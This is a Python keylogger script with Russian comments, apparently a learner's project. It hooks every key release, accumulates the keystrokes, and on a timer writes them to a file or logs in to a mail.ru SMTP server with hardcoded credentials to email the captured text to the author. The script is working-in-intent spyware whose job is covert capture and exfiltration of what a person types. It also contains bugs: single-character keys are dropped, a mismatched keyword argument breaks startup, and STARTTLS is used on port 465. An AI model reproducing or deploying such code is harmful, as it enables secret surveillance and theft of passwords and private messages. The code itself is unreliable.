'''
1) юзер вводит текст, он записывается в файл
через какое-то время он отправляется мне на почту

1) найти средство для обработки нажатий (pip install keyboard)
2) запись в файл через ith as
3) найти способо, чтобы отправлять данные на mail (SMTP - pip install smtplib
4) treading -> Timer (модуль таймер (через какое-то время)

'''
import keyboard
import smtplib
from threading import Timer
from datetime import datetime


SEND_REPORT_EVERY = 60 # время в секундах для отправки на почту

#для работы с отправкой почты
EMAIL_ADDRESS ="vobig94542@jrvps.com"
EMAIL_PASSWORD = "pass"

class Keylogger:
    def __init__(self, interval, report_methods="email"):
        self.interval = interval
        self.report_method = report_methods
        #сюда будут записаны логи
        self.log = "" #мы хотим чтобы изначально это были пустые данные
        #начало и конец записи
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def callback(self, event):
        name = event.name #это метод нашего класса
        #проверяем: если длина нашего лен больше 1 то тогда проверяем имя
        if len (name) > 1:
            if name == 'space':
                 name = " "
            elif name == "enter":
                 name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

            self.log += name

    def update_filename(self):
    #создаем файл
         start_dt_str: object = str(self.start_date)[:-7].replace(" ", "-").replace(":","-")
         end_dt_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")

         self.filename = f"log -{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}", "w", encoding='utf-8') as f:
            print(self.log, file=f)
        print(f"[+] SAVED {self.filename}.txt")


    def sendmail(self, email, password, message):
        #подключение к серверу по SMTP
        server = smtplib.SMTP(host="smtp.mail.ru", port=465)
        #подключаемся в режиме TLS
        server.starttls()
        #авторизация
        server.login(email, password)
        # отправка
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            #обн. имя файла
            self.update_filename()
            if self.report_method == 'email':
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_date = datetime.now()
        self.log = " "
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == '__main__':
    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
    keylogger.start()
